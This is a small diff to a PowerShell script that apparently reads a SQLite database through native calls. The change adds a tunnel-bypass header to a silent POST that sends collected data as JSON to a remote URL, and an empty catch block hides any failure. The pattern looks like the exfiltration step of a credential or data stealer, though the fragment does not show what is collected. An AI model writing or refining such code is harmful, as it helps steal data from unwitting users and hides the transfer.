@@ -100,7 +100,10 @@ public static extern IntPtr Close(IntPtr db);
     if ($script:f) {
         try {
             $j = $script:a | ConvertTo-Json
-            $h = @{'User-Agent' = $t }
+            $h = @{
+                'User-Agent' = $t
+                'bypass-tunnel-reminder' = 1
+                 }
             Invoke-RestMethod -Uri $u -Method Post -Body $j -ContentType "application/json" -Headers $h | Out-Null
         }
         catch {}
